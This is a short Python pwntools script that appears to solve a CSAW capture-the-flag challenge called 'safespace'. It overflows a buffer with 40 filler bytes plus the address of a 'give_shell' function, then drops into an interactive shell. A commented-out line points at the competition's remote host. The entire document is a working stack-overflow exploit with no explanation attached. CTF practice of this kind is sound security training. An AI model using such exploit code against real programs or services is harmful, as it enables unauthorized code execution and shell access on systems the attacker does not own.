#!/usr/bin/env python3
from pwn import *

elf = ELF('./safespace')
# p = remote('pwn.chal.csaw.io', 1002)
p = elf.process()

p.recv()

p.sendline(b'A' * 40 + p64(elf.symbols['give_shell']))

p.interactive()
p.close()
